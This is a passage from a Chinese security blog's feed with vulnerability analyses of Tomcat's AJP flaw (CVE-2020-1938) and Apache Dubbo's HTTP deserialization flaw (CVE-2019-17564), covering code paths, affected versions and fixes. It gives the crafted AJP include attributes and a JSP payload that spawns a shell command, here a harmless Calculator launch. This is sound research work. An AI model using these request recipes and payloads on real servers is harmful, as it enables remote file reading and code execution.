class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">&lt;!-- The mapping for the default servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>会交给<code>org.apache.catalina.servlets.DefaultServlet</code>的<code>doGet</code>方法处理。<code>doGet</code>会调用<code>ServeResource</code>方法进行具体的资源读取操作。首先它会调用 <code>getRelativePath</code>方法获取要读取资源的相对路径，这里注意它是本次任意读取漏洞的关键，我们先往下看后续再细说它。通过<code>getResources</code>方法就可以获取到了对应路径的Web资源对象了。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/443FAD03-C388-4EC9-BB1C-90FA1AA30396.png" alt="ServeResource文件读取操作"></p><p>最后资源对象的内容随着<code>resourceBody</code>被写入了<code>ostream</code>流对象中返回给客户端。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/41165822-5864-456D-82D2-F537D3BEA2DB.png" alt="资源对象内容被写入ostream"></p><p>接下来我们来看漏洞真正核心，<code>org.apache.catalina.servlets.DefaultServlet</code>类的<code>getRelativePath()</code>，它负责获取资源的相对路径。由于我们AJP请求设置<code>javax.servlet.include.request_uri</code>属性值为<code>/</code>不为<code>null</code>。故资源<br>的相对路径构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= javax.servlet.include.path_info + javax.servlet.include.path_info</span><br><span class="line">= / + WEB-INF/web.xml</span><br><span class="line">= /WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/getRelativePath.png" alt="getRelativePath根据三个include属性获取资源相对路径"></p><p>这就导致我们虽然请求的是<code>/docs/test.jpg</code>文件内容，而实际上返回了<code>/docs/WEB-INF/web.xml</code>文件的内容。</p><p>至此大家可能有两个疑问</p><p><strong>问题1：为何Tomcat处理HTTP协议不存在该问题？</strong></p><p>答：因为在HTTP请求中，我们无法控制request对象三个<code>include</code>属性的值，而在AJP请求中可以。</p><p><strong>问题2：为何无法跳出webapps目录读文件呢？</strong></p><p><code>DefaultServlet</code>在读取资源时</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/2A1EE7C0-797C-4EF0-A60C-62BEE428403E.png" alt="跳目录读文件"></p><p>会调用<code>org.apache.tomcat.util.http.RequestUtil</code>工具类中的<code>normalize</code>方法来对路径进行校验，如果存在<code>./</code>或<code>../</code>则会返回<code>null</code>,最终会抛出一个非法路径的异常终止文件读取操作。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/473B80B4-0C17-420D-B889-7017DD18B666.png" alt="normalize对路径进行校验导致无法跳目录"></p><h4 id="2-2-任意代码执行"><a href="#2-2-任意代码执行" class="headerlink" title="2.2 任意代码执行"></a>2.2 任意代码执行</h4><p>任意代码执行问题出现在<code>org.apache.jasper.servlet.JspServlet</code>这个servlet，假设我们发出一个请求内容如下的AJP请求,让Tomcat执行<code>/docs/test.jsp</code>，但实际上它会将<code>code.txt</code>当成jsp来解析执行.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/docs/test.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: code.txt</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>code.txt内容如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.util.List&lt;String&gt; commands = <span class="keyword">new</span> java.util.ArrayList&lt;String&gt;();</span><br><span class="line">commands.add(<span class="string">"/bin/bash"</span>);</span><br><span class="line">commands.add(<span class="string">"-c"</span>);</span><br><span class="line">commands.add(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">java.lang.ProcessBuilder pb = <span class="keyword">new</span> java.lang.ProcessBuilder(commands);</span><br><span class="line">pb.start();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>按照映射规则,我们的请求会被<br><code>org.apache.jasper.servlet.JspServlet</code>进行处理。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>fork<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>xpoweredBy<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>3<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">&lt;!-- The mappings for the JSP servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jspx<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于<code>javax.servlet.include.servlet_path</code>值为<code>/</code>不为<code>null</code>,所以根据代码逻辑我们jsp文件的路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jspUri = javax.servlet.include.servlet_path + javax.servlet.include.path_info</span><br><span class="line">jspUri = / + code.txt</span><br><span class="line">jspUri = /code.txt</span><br></pre></td></tr></table></figure><p>可见<code>jspUri</code>是客户端可控。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/7EE0D33F-5FEA-4F9F-A944-9F3FA1CE1C4D.png" alt="jspUri的构造"></p><p>由我们控制的<code>jspuri</code>被封装成了一个<code>JspServletWrapper</code>添加到了Jsp运行上下文<code>JspRuntimeContext</code>中.最后<code>wrapper.service()</code>会编译<code>code.txt</code>,并执行它的<code>_jspService()</code>方法来处理当前请求，我们的代码被执行。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/4D7B7BDF-CAFB-43F7-BF81-D4AB3EE44DFF.png" alt="code.txt被tomcat编译执行"></p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/23BFC3AE-EC40-4DF3-AD0E-913A913B3F9E.png" alt="code.txt被tomcat编译执行"></p><p>综上整个过程就清晰了，简而言之就是我们发送AJP请求，请求的是<code>/docs/test.jsp</code>这个jsp,但是由于那三个include属性可控,我们可以将<code>test.jsp</code>对应的服务器脚本文件改为了<code>code.txt</code>。<br>导致tomcat把我们的<code>code.txt</code>当jsp文件编译运行，导致代码执行。</p><p>最后给大家提两个问题：</p><p><strong>问题1: 请求的/docs/test.jsp需要在web目录下真是存在么？</strong></p><p>答： 不需要，我们只是为了让请求路径命中<code>org.apache.catalina.servlets.DefaultServlet</code>这个servlet的匹配规则。</p><p><strong>问题2: 如果tomcat不解析任何jsp,jspx等后缀，或者以它们为view的模板，还能触发漏洞么？如果可以又该如何触发？</strong></p><p>PS：这个问题是一个师傅留给我的，觉得很有意思，分享给大家思考，有想法的可以留言讨论。</p><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p>Tomcat在8.5.51版本做了如下修复 ：</p><ol><li>默认不开启AJP</li><li>默认只监听本地ip</li><li>强制设置认证secret</li><li>代码层面主要在<code>AjpProcessor</code>类的<code>prepareRequest</code>方法封装<code>requst</code>对象时采用了白名单，只添加已知属性。这样<code>三个include属性</code>不再被客户端控制，漏洞修复。</li></ol><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/E57AE140-7077-4F97-AEBD-5011AE8D8BCE.png" alt="修复代码"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ" target="_blank" rel="noopener">【WEB安全】Tomcat-Ajp协议漏洞分析</a></li><li><a href="https://github.com/apache/tomcat/commit/b99fba5bd796d876ea536e83299603443842feba" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/b99fba5bd796d876ea536e83299603443842feba</a></li><li><a href="https://github.com/apache/tomcat/commit/40d5d93bd284033cf4a1f77f5492444f83d803e2" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/40d5d93bd284033cf4a1f77f5492444f83d803e2</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h2&gt;&lt;p&gt;Tomcat根据默认配置(&lt;code&gt;conf/server.xml&lt;/code&gt;）
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="tomcat" scheme="http://gv7.me/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-17564:Apache dubbo HTTP协议反序列化漏洞分析</title>
    <link href="http://gv7.me/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/"/>
    <id>http://gv7.me/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/</id>
    <published>2020-02-14T15:24:22.000Z</published>
    <updated>2020-02-22T08:41:02.441Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Apache dubbo是一个是基于Java的高性能开源RPC框架。它支持dubbo，http,rmi,hessian等协议。本次问题出现在dubbo开启http协议后，会将消费者提交的<code>request</code>请求，在无安全校验的情况下直接交给了<code>spring-web.jar</code>进行处理，最终<code>request.getInputStream()</code>被反序列化,故存在反序列化漏洞。下面我们来调试分析代码。</p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><ul><li>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</li><li>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</li><li>Apache Dubbo = 2.5.x </li></ul><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><ul><li>OS: Mac OSX</li><li>JDK: 1.8.0_191</li><li>Dubbo: 2.7.3</li></ul><p>环境搭建这里我选择官方的<code>samples</code>中的<code>dubbo-samples-http</code></p><p><a href="https://github.com/apache/dubbo-samples/" target="_blank" rel="noopener">https://github.com/apache/dubbo-samples/</a></p><p>源码下载后将<code>pom.xml</code>中指定的dubbo版本修改为<code>2.7.3</code>,同时加入<code>commons-collections4-4.0.jar</code>方便测试。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source.level</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">target.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target.level</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 修改dubbo版本为2.7.3 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo.version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">dubbo.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>4.3.16.RELEASE<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">junit.version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">junit.version</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">&lt;!-- 添加一个可用的Gadget到classpath --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时dubbo依赖zookeeper,请自行安装！</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>dubbo启用http协议后，所有的请求都会通过<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler</code>类的<code>handle</code>方法进行处理。我们在这打断点，并发送poc开始跟踪分析。</p><p>首先<code>handle</code>方法会获取请求路径，然后通过这个路径去<code>skeletonMap</code>里获取到该接口对应的处理对象，来处理当前<code>request</code>请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取请求的路径(/org.apache.dubbo.samples.http.api.DemoService)</span></span><br><span class="line">    String uri = request.getRequestURI();</span><br><span class="line">    <span class="comment">// 2. 通过请求的接口路径获取对应的处理对象</span></span><br><span class="line">    HttpInvokerServiceExporter skeleton = (HttpInvokerServiceExporter)HttpProtocol.<span class="keyword">this</span>.skeletonMap.get(uri);</span><br><span class="line">    <span class="keyword">if</span> (!request.getMethod().equalsIgnoreCase(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        response.setStatus(<span class="number">500</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        RpcContext.getContext().setRemoteAddress(request.getRemoteAddr(), request.getRemotePort());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 使用获取到的处理对象进行处理请求</span></span><br><span class="line">            skeleton.handleRequest(request, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步中存储接口地址和处理对象的<code>skeletonMap</code></p><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/skeletonMap.png" alt="skeletonMap存储内容"></p><p>处理对象是<code>HttpInvokerServiceExporter</code>类对象，它负责获取远程调用对象，并执行获取结果返回给客户端。跟进它的<code>handleRequest</code>方法，<code>request</code>对象被传入<code>readRemoteInvocation</code>方法中来获取<code>RemoteInvocation</code>远程调用对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 从request对象获取远程调用对象</span></span><br><span class="line">        RemoteInvocation invocation = <span class="keyword">this</span>.readRemoteInvocation(request);</span><br><span class="line">        RemoteInvocationResult result = <span class="keyword">this</span>.invokeAndCreateResult(invocation, <span class="keyword">this</span>.getProxy());</span><br><span class="line">        <span class="keyword">this</span>.writeRemoteInvocationResult(request, response, result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NestedServletException(<span class="string">"Class not found during deserialization"</span>, var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readRemoteInvocation</code>方法将<code>request.getInputStream()</code>(我们提交的序列化内容)传入<code>createObjectInputStream</code>方法，封装为一个<code>ObjectInputStream</code>。该对象又被传入<code>doReadRemoteInvocation</code>方法中，进行最终的获取操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">readRemoteInvocation</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 传入request对象和request.getInputStream()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.readRemoteInvocation(request, request.getInputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 2. 将request.getInputStream()封装为ObjectInputStream</span></span><br><span class="line">    ObjectInputStream ois = <span class="keyword">this</span>.createObjectInputStream(<span class="keyword">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">    RemoteInvocation var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 3. 获取RemoteInvocation远程调用对象</span></span><br><span class="line">        var4 = <span class="keyword">this</span>.doReadRemoteInvocation(ois);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>doReadRemoteInvocation</code>方法中，<code>ObjectInputStream</code>类对象<code>ois</code>直接被反序列化了。这个过程中没有进行任何过滤，导致我们传入的恶意序列化对象可以被反序列化创建，漏洞触发！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.rmi.org.springframework.remoting.rmi.RemoteInvocationSerializingExporter</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 恶意对象在此被反序列化，漏洞触发</span></span><br><span class="line">    Object obj = ois.readObject();</span><br><span class="line">    <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RemoteException(<span class="string">"Deserialized object needs to be assignable to type ["</span> + RemoteInvocation.class.getName() + <span class="string">"]: "</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (RemoteInvocation)obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/exploit-demo.png" alt="利用演示"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>漏洞出现的原因<code>dubbo</code>HTTP接口将携带有恶意反序列化数据的<code>request</code>，在无安全校验的情况下直接交给了<code>spring-web.jar</code>的<code>HttpInvokerServiceExporter</code>进行处理，导致存在反序列化漏洞。按理说这个漏洞不仅仅只是<code>dubbo</code>自身的问题，还是<code>spring</code>的问题。</p><p>在2.7.4.1版本开始，dubbo处理HTTP接口的调用请求交给了<code>jsonrpc4j.jar</code>的<code>JsonRpcServer</code>去处理了。</p><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/fix.png" alt="修复方式"></p><p>跟踪分析<code>JsonRpcServer</code>类的<code>handle</code>方法后，<code>request.getInputStream()</code>没有再被反序列化了。所以原来的利用方法失效了。</p><h2 id="0x06-漏洞总结"><a href="#0x06-漏洞总结" class="headerlink" title="0x06 漏洞总结"></a>0x06 漏洞总结</h2><p>该漏洞利用虽然简单粗暴，但在黑盒情况下利用难点有两个，一是我们无法得知web服务是否是dubbo http接口。二是如何获取接口路径，该路径可以在服务器上的<code>zookeeper</code>和<code>http-provider</code>配置文件中找到，如果不配合其他漏洞是不容易获取的。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html" target="_blank" rel="noopener">https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html</a></li><li><a href="https://mp.weixin.qq.com/s/CMA79NyeZN2e_nSxj8L-wQ" target="_blank" rel="noopener">CVE-2019-17564：Apache Dubbo反序列化漏洞分析</a></li><li><a href="https://mp.weixin.qq.com/s/pHnhHMNArAiZPVGR1btZIg" target="_blank" rel="noopener">【安全风险通告】Apache Dubbo反序列化漏洞安全风险通告</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h2&gt;&lt;p&gt;Apache dubbo是一个是基于Java的高性能开源RPC框架。它支持dubbo
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="dubbo" scheme="http://gv7.me/tags/dubbo/"/>
    
  </entry>
  
  <entry>
    <title>fortify规则库解密之旅</title>
    <link href="http://gv7.me/articles/2019/fortify-rule-library-decryption-process/"/>
    <id>http://gv7.me/articles/2019/fortify-rule-library-decryption-process/</id>
    <published>2019-12-22T15:18:28.000Z</published>
    <updated>2019-12-23T17:27:09.428Z</updated>
    
